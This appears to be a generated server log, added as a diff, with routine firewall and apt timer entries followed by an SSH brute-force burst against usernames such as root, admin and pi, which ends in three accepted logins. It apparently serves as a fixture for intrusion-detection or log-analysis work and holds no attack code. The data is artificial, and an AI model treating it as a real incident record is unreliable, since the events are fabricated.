+Apr 29 03:37:41 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:37:52 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:38:16 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:38:35 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:39:03 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:39:20 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:39:40 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:39:51 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:40:15 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:40:37 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:41:29 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:41:36 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:41:59 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:42:19 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:42:56 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:43:22 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:44:19 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:44:32 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:44:55 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:45:21 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:46:04 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:46:26 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:46:59 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:47:04 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:48:00 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:48:07 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:48:31 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:48:51 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:49:42 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:50:04 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:50:56 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:51:04 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:51:53 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:52:09 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:52:46 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:53:15 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:53:47 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:54:07 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:54:23 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:54:31 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:54:54 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:55:08 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:55:44 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:55:53 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:56:50 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:57:01 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:57:41 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:57:47 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:58:13 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:58:30 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:58:43 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 03:58:56 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 03:59:46 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:00:02 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:01:00 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:01:30 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:02:13 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:02:22 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:03:05 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:03:34 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:04:03 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:04:22 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:04:53 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:05:09 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:05:28 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:05:37 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:06:35 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:06:56 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:07:13 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:07:23 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:07:36 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:07:51 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:08:07 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:08:15 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:09:10 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:09:20 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:09:37 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:09:43 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:10:12 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:10:24 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:10:50 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:11:08 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:12:01 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:12:29 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:12:49 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:13:13 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:14:00 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:14:27 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:14:57 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:15:15 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:16:00 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:16:13 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:16:25 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:16:41 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:17:26 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:17:41 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:17:58 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:18:27 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:19:17 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:19:30 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:20:19 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:20:30 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:21:26 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:21:39 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:21:54 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:22:09 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:22:59 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:23:25 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:24:02 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:24:25 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:24:53 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:25:21 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:26:01 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:26:21 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 04:27:13 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 04:27:34 prod-server-01 sshd[4161]: Failed password for pi from 45.33.32.156 port 37996 ssh2
+Apr 29 04:27:35 prod-server-01 sshd[1077]: Accepted password for pi from 45.33.32.156 port 17317 ssh2
+Apr 29 04:27:35 prod-server-01 sshd[8663]: Failed password for admin from 194.165.16.11 port 57512 ssh2
+Apr 29 04:27:36 prod-server-01 sshd[1114]: Failed password for deploy from 45.33.32.156 port 26100 ssh2
+Apr 29 04:27:37 prod-server-01 sshd[7223]: Failed password for root from 194.165.16.11 port 55000 ssh2
+Apr 29 04:27:39 prod-server-01 sshd[8027]: Failed password for postgres from 192.168.100.55 port 60424 ssh2
+Apr 29 04:27:40 prod-server-01 sshd[6008]: Failed password for admin from 194.165.16.11 port 45566 ssh2
+Apr 29 04:27:43 prod-server-01 sshd[8214]: Failed password for ubuntu from 194.165.16.11 port 46854 ssh2
+Apr 29 04:27:44 prod-server-01 sshd[1300]: Failed password for postgres from 45.33.32.156 port 39661 ssh2
+Apr 29 04:27:47 prod-server-01 sshd[1921]: Failed password for ubuntu from 45.33.32.156 port 59497 ssh2
+Apr 29 04:27:49 prod-server-01 sshd[2718]: Failed password for deploy from 185.220.101.45 port 10230 ssh2
+Apr 29 04:27:51 prod-server-01 sshd[9425]: Failed password for deploy from 185.220.101.45 port 31276 ssh2
+Apr 29 04:27:53 prod-server-01 sshd[4781]: Failed password for admin from 192.168.100.55 port 29281 ssh2
+Apr 29 04:27:56 prod-server-01 sshd[1599]: Failed password for root from 192.168.100.55 port 27953 ssh2
+Apr 29 04:27:59 prod-server-01 sshd[3837]: Failed password for pi from 185.220.101.45 port 43897 ssh2
+Apr 29 04:28:01 prod-server-01 sshd[6353]: Failed password for ubuntu from 91.240.118.222 port 32187 ssh2
+Apr 29 04:28:03 prod-server-01 sshd[6919]: Failed password for ubuntu from 45.33.32.156 port 31437 ssh2
+Apr 29 04:28:06 prod-server-01 sshd[5002]: Failed password for deploy from 185.220.101.45 port 14811 ssh2
+Apr 29 04:28:07 prod-server-01 sshd[2864]: Failed password for admin from 192.168.100.55 port 1794 ssh2
+Apr 29 04:28:10 prod-server-01 sshd[5479]: Failed password for root from 45.33.32.156 port 37048 ssh2
+Apr 29 04:28:12 prod-server-01 sshd[2380]: Failed password for ubuntu from 192.168.100.55 port 53488 ssh2
+Apr 29 04:28:13 prod-server-01 sshd[3100]: Failed password for oracle from 91.240.118.222 port 29676 ssh2
+Apr 29 04:28:16 prod-server-01 sshd[1220]: Failed password for postgres from 194.165.16.11 port 21146 ssh2
+Apr 29 04:28:19 prod-server-01 sshd[6930]: Failed password for pi from 185.220.101.45 port 49944 ssh2
+Apr 29 04:28:20 prod-server-01 sshd[9104]: Failed password for postgres from 45.33.32.156 port 53769 ssh2
+Apr 29 04:28:23 prod-server-01 sshd[8497]: Failed password for pi from 185.220.101.45 port 18149 ssh2
+Apr 29 04:28:24 prod-server-01 sshd[7294]: Failed password for root from 45.33.32.156 port 57524 ssh2
+Apr 29 04:28:26 prod-server-01 sshd[5093]: Failed password for root from 45.33.32.156 port 22771 ssh2
+Apr 29 04:28:28 prod-server-01 sshd[9798]: Failed password for ubuntu from 192.168.100.55 port 36073 ssh2
+Apr 29 04:28:31 prod-server-01 sshd[4236]: Failed password for oracle from 45.33.32.156 port 56092 ssh2
+Apr 29 04:28:33 prod-server-01 sshd[9568]: Failed password for root from 194.165.16.11 port 38324 ssh2
+Apr 29 04:28:36 prod-server-01 sshd[4055]: Failed password for admin from 185.220.101.45 port 34877 ssh2
+Apr 29 04:28:38 prod-server-01 sshd[3088]: Failed password for deploy from 45.33.32.156 port 63801 ssh2
+Apr 29 04:28:39 prod-server-01 sshd[5141]: Failed password for postgres from 192.168.100.55 port 58459 ssh2
+Apr 29 04:28:41 prod-server-01 sshd[7633]: Failed password for ubuntu from 45.33.32.156 port 21075 ssh2
+Apr 29 04:28:44 prod-server-01 sshd[2103]: Failed password for ubuntu from 192.168.100.55 port 7973 ssh2
+Apr 29 04:28:47 prod-server-01 sshd[8978]: Failed password for ubuntu from 185.220.101.45 port 22366 ssh2
+Apr 29 04:28:49 prod-server-01 sshd[7255]: Failed password for deploy from 192.168.100.55 port 61939 ssh2
+Apr 29 04:28:51 prod-server-01 sshd[3814]: Failed password for oracle from 192.168.100.55 port 44700 ssh2
+Apr 29 04:28:54 prod-server-01 sshd[7296]: Failed password for ubuntu from 192.168.100.55 port 53836 ssh2
+Apr 29 04:28:56 prod-server-01 sshd[5294]: Failed password for oracle from 192.168.100.55 port 15285 ssh2
+Apr 29 04:28:59 prod-server-01 sshd[4803]: Failed password for postgres from 91.240.118.222 port 3987 ssh2
+Apr 29 04:29:01 prod-server-01 sshd[1170]: Failed password for oracle from 194.165.16.11 port 58248 ssh2
+Apr 29 04:29:02 prod-server-01 sshd[2185]: Failed password for admin from 192.168.100.55 port 64135 ssh2
+Apr 29 04:29:04 prod-server-01 sshd[7661]: Failed password for pi from 185.220.101.45 port 49689 ssh2
+Apr 29 04:29:06 prod-server-01 sshd[3005]: Failed password for postgres from 194.165.16.11 port 50934 ssh2
+Apr 29 04:29:08 prod-server-01 sshd[8820]: Failed password for oracle from 185.220.101.45 port 38643 ssh2
+Apr 29 04:29:09 prod-server-01 sshd[1295]: Failed password for admin from 185.220.101.45 port 42549 ssh2
+Apr 29 04:29:11 prod-server-01 sshd[2694]: Failed password for ubuntu from 45.33.32.156 port 34558 ssh2
+Apr 29 04:29:13 prod-server-01 sshd[7867]: Failed password for admin from 45.33.32.156 port 6555 ssh2
+Apr 29 04:29:15 prod-server-01 sshd[5822]: Failed password for ubuntu from 91.240.118.222 port 40447 ssh2
+Apr 29 04:29:18 prod-server-01 sshd[7089]: Failed password for root from 194.165.16.11 port 43332 ssh2
+Apr 29 04:29:21 prod-server-01 sshd[2586]: Accepted password for root from 194.165.16.11 port 19672 ssh2
+Apr 29 04:29:21 prod-server-01 sshd[8762]: Failed password for ubuntu from 194.165.16.11 port 61379 ssh2
+Apr 29 04:29:24 prod-server-01 sshd[8215]: Failed password for admin from 45.33.32.156 port 16155 ssh2
+Apr 29 04:29:26 prod-server-01 sshd[6541]: Failed password for pi from 91.240.118.222 port 31730 ssh2
+Apr 29 04:29:27 prod-server-01 sshd[8895]: Failed password for admin from 91.240.118.222 port 46577 ssh2
+Apr 29 04:29:29 prod-server-01 sshd[9379]: Failed password for oracle from 45.33.32.156 port 55355 ssh2
+Apr 29 04:29:30 prod-server-01 sshd[2677]: Failed password for admin from 91.240.118.222 port 3264 ssh2
+Apr 29 04:29:31 prod-server-01 sshd[3403]: Failed password for admin from 185.220.101.45 port 36951 ssh2
+Apr 29 04:29:32 prod-server-01 sshd[6935]: Failed password for pi from 192.168.100.55 port 31497 ssh2
+Apr 29 04:29:33 prod-server-01 sshd[8324]: Failed password for oracle from 192.168.100.55 port 23283 ssh2
+Apr 29 04:29:34 prod-server-01 sshd[2408]: Failed password for root from 192.168.100.55 port 58194 ssh2
+Apr 29 04:29:37 prod-server-01 sshd[7765]: Failed password for admin from 45.33.32.156 port 6520 ssh2
+Apr 29 04:29:40 prod-server-01 sshd[7813]: Failed password for root from 194.165.16.11 port 30323 ssh2
+Apr 29 04:29:42 prod-server-01 sshd[7070]: Failed password for admin from 45.33.32.156 port 50922 ssh2
+Apr 29 04:29:44 prod-server-01 sshd[5854]: Failed password for ubuntu from 185.220.101.45 port 20041 ssh2
+Apr 29 04:29:46 prod-server-01 sshd[4123]: Failed password for deploy from 192.168.100.55 port 43711 ssh2
+Apr 29 04:29:47 prod-server-01 sshd[7880]: Failed password for admin from 45.33.32.156 port 25291 ssh2
+Apr 29 04:29:48 prod-server-01 sshd[1972]: Failed password for oracle from 45.33.32.156 port 18696 ssh2
+Apr 29 04:29:50 prod-server-01 sshd[7448]: Failed password for postgres from 45.33.32.156 port 50073 ssh2
+Apr 29 04:29:51 prod-server-01 sshd[5606]: Failed password for root from 192.168.100.55 port 61957 ssh2
+Apr 29 04:29:54 prod-server-01 sshd[4276]: Failed password for postgres from 192.168.100.55 port 43809 ssh2
+Apr 29 04:29:57 prod-server-01 sshd[8437]: Failed password for root from 185.220.101.45 port 30373 ssh2
+Apr 29 04:29:58 prod-server-01 sshd[6236]: Failed password for oracle from 91.240.118.222 port 52601 ssh2
+Apr 29 04:30:01 prod-server-01 sshd[5200]: Failed password for deploy from 194.165.16.11 port 51199 ssh2
+Apr 29 04:30:02 prod-server-01 sshd[3160]: Failed password for root from 192.168.100.55 port 62891 ssh2
+Apr 29 04:30:05 prod-server-01 sshd[5988]: Failed password for postgres from 185.220.101.45 port 16290 ssh2
+Apr 29 04:30:06 prod-server-01 sshd[2231]: Failed password for admin from 192.168.100.55 port 3818 ssh2
+Apr 29 04:30:09 prod-server-01 sshd[4714]: Failed password for ubuntu from 185.220.101.45 port 41733 ssh2
+Apr 29 04:30:11 prod-server-01 sshd[7788]: Failed password for root from 194.165.16.11 port 8533 ssh2
+Apr 29 04:30:14 prod-server-01 sshd[3513]: Failed password for postgres from 91.240.118.222 port 61565 ssh2
+Apr 29 04:30:16 prod-server-01 sshd[7124]: Failed password for admin from 194.165.16.11 port 44125 ssh2
+Apr 29 04:30:17 prod-server-01 sshd[4460]: Failed password for root from 192.168.100.55 port 8456 ssh2
+Apr 29 04:30:19 prod-server-01 sshd[1646]: Failed password for admin from 185.220.101.45 port 22279 ssh2
+Apr 29 04:30:22 prod-server-01 sshd[6672]: Failed password for deploy from 194.165.16.11 port 3233 ssh2
+Apr 29 04:30:24 prod-server-01 sshd[9507]: Failed password for admin from 192.168.100.55 port 55840 ssh2
+Apr 29 04:30:27 prod-server-01 sshd[4088]: Failed password for deploy from 185.220.101.45 port 12044 ssh2
+Apr 29 04:30:30 prod-server-01 sshd[6890]: Failed password for deploy from 45.33.32.156 port 1440 ssh2
+Apr 29 04:30:32 prod-server-01 sshd[3389]: Failed password for pi from 194.165.16.11 port 41022 ssh2
+Apr 29 04:30:35 prod-server-01 sshd[7558]: Failed password for root from 91.240.118.222 port 39239 ssh2
+Apr 29 04:30:38 prod-server-01 sshd[6143]: Failed password for postgres from 45.33.32.156 port 39718 ssh2
+Apr 29 04:30:39 prod-server-01 sshd[5434]: Failed password for root from 194.165.16.11 port 9656 ssh2
+Apr 29 04:30:41 prod-server-01 sshd[7359]: Failed password for ubuntu from 194.165.16.11 port 30174 ssh2
+Apr 29 04:30:43 prod-server-01 sshd[1988]: Failed password for deploy from 192.168.100.55 port 27374 ssh2
+Apr 29 04:30:46 prod-server-01 sshd[4270]: Failed password for postgres from 91.240.118.222 port 54572 ssh2
+Apr 29 04:30:48 prod-server-01 sshd[9243]: Failed password for deploy from 185.220.101.45 port 18389 ssh2
+Apr 29 04:30:51 prod-server-01 sshd[3778]: Failed password for oracle from 185.220.101.45 port 38672 ssh2
+Apr 29 04:30:54 prod-server-01 sshd[2438]: Failed password for admin from 194.165.16.11 port 26769 ssh2
+Apr 29 04:30:55 prod-server-01 sshd[1927]: Failed password for deploy from 194.165.16.11 port 64882 ssh2
+Apr 29 04:30:57 prod-server-01 sshd[1556]: Failed password for ubuntu from 91.240.118.222 port 7116 ssh2
+Apr 29 04:30:59 prod-server-01 sshd[8474]: Failed password for postgres from 194.165.16.11 port 61400 ssh2
+Apr 29 04:31:01 prod-server-01 sshd[3162]: Failed password for oracle from 192.168.100.55 port 47428 ssh2
+Apr 29 04:31:03 prod-server-01 sshd[6120]: Accepted password for oracle from 192.168.100.55 port 31405 ssh2
+Apr 29 04:31:03 prod-server-01 sshd[1354]: Failed password for admin from 185.220.101.45 port 58417 ssh2
+Apr 29 04:31:05 prod-server-01 sshd[5381]: Failed password for pi from 194.165.16.11 port 3086 ssh2
+Apr 29 04:31:07 prod-server-01 sshd[4341]: Failed password for oracle from 185.220.101.45 port 56744 ssh2
+Apr 29 04:31:10 prod-server-01 sshd[9616]: Failed password for deploy from 91.240.118.222 port 45492 ssh2
+Apr 29 04:31:11 prod-server-01 sshd[5857]: Failed password for pi from 45.33.32.156 port 51629 ssh2
+Apr 29 04:31:14 prod-server-01 sshd[2007]: Failed password for oracle from 45.33.32.156 port 19618 ssh2
+Apr 29 04:31:16 prod-server-01 sshd[6207]: Failed password for pi from 45.33.32.156 port 15064 ssh2
+Apr 29 04:31:19 prod-server-01 sshd[3818]: Failed password for admin from 192.168.100.55 port 62867 ssh2
+Apr 29 04:31:22 prod-server-01 sshd[4695]: Failed password for admin from 192.168.100.55 port 5676 ssh2
+Apr 29 04:31:23 prod-server-01 sshd[7240]: Failed password for postgres from 194.165.16.11 port 40986 ssh2
+Apr 29 04:31:26 prod-server-01 sshd[7661]: Failed password for ubuntu from 192.168.100.55 port 18686 ssh2
+Apr 29 04:31:29 prod-server-01 sshd[4406]: Failed password for deploy from 185.220.101.45 port 14256 ssh2
+Apr 29 04:31:32 prod-server-01 sshd[7404]: Failed password for admin from 192.168.100.55 port 49150 ssh2
+Apr 29 04:31:34 prod-server-01 sshd[5842]: Failed password for root from 194.165.16.11 port 29571 ssh2
+Apr 29 04:31:35 prod-server-01 sshd[9945]: Failed password for admin from 45.33.32.156 port 40787 ssh2
+Apr 29 04:31:36 prod-server-01 sshd[9962]: Failed password for admin from 185.220.101.45 port 52856 ssh2
+Apr 29 04:31:37 prod-server-01 sshd[5911]: Failed password for root from 185.220.101.45 port 50775 ssh2
+Apr 29 04:31:39 prod-server-01 sshd[4581]: Failed password for deploy from 185.220.101.45 port 8453 ssh2
+Apr 29 04:31:42 prod-server-01 sshd[3522]: Failed password for postgres from 91.240.118.222 port 44788 ssh2
+Apr 29 04:31:45 prod-server-01 sshd[5150]: Failed password for pi from 192.168.100.55 port 23437 ssh2
+Apr 29 04:31:47 prod-server-01 sshd[2398]: Failed password for root from 194.165.16.11 port 18182 ssh2
+Apr 29 04:31:48 prod-server-01 sshd[6959]: Failed password for admin from 91.240.118.222 port 2256 ssh2
+Apr 29 04:31:49 prod-server-01 sshd[8798]: Failed password for admin from 185.220.101.45 port 17371 ssh2
+Apr 29 04:31:52 prod-server-01 sshd[6050]: Failed password for pi from 91.240.118.222 port 30512 ssh2
+Apr 29 04:31:54 prod-server-01 sshd[2574]: Failed password for pi from 185.220.101.45 port 41094 ssh2
+Apr 29 04:31:57 prod-server-01 sshd[4658]: Failed password for admin from 192.168.100.55 port 19625 ssh2
+Apr 29 04:31:59 prod-server-01 sshd[9196]: Failed password for deploy from 194.165.16.11 port 56817 ssh2
+Apr 29 04:32:00 prod-server-01 sshd[8377]: Failed password for root from 194.165.16.11 port 25345 ssh2
+Apr 29 04:32:03 prod-server-01 sshd[1106]: Failed password for ubuntu from 192.168.100.55 port 23784 ssh2
+Apr 29 04:32:05 prod-server-01 sshd[1877]: Failed password for admin from 45.33.32.156 port 1471 ssh2
+Apr 29 04:32:08 prod-server-01 sshd[4033]: Failed password for root from 194.165.16.11 port 30732 ssh2
+Apr 29 04:32:11 prod-server-01 sshd[8533]: Failed password for deploy from 91.240.118.222 port 44918 ssh2
+Apr 29 04:32:13 prod-server-01 sshd[5571]: Failed password for ubuntu from 194.165.16.11 port 56911 ssh2
+Apr 29 04:32:15 prod-server-01 sshd[1103]: Failed password for root from 194.165.16.11 port 6809 ssh2
+Apr 29 04:32:16 prod-server-01 sshd[9922]: Failed password for root from 45.33.32.156 port 8381 ssh2
+Apr 29 04:32:18 prod-server-01 sshd[8762]: Failed password for ubuntu from 194.165.16.11 port 8461 ssh2
+Apr 29 04:32:21 prod-server-01 sshd[6269]: Failed password for oracle from 185.220.101.45 port 40429 ssh2
+Apr 29 04:32:23 prod-server-01 sshd[7338]: Failed password for root from 185.220.101.45 port 48415 ssh2
+Apr 29 04:32:26 prod-server-01 sshd[9985]: Failed password for root from 194.165.16.11 port 34421 ssh2
+Apr 29 04:32:29 prod-server-01 sshd[3384]: Failed password for oracle from 194.165.16.11 port 53302 ssh2
+Apr 29 04:32:30 prod-server-01 sshd[2884]: Failed password for admin from 194.165.16.11 port 23203 ssh2
+Apr 29 04:32:32 prod-server-01 sshd[7123]: Failed password for ubuntu from 45.33.32.156 port 19247 ssh2
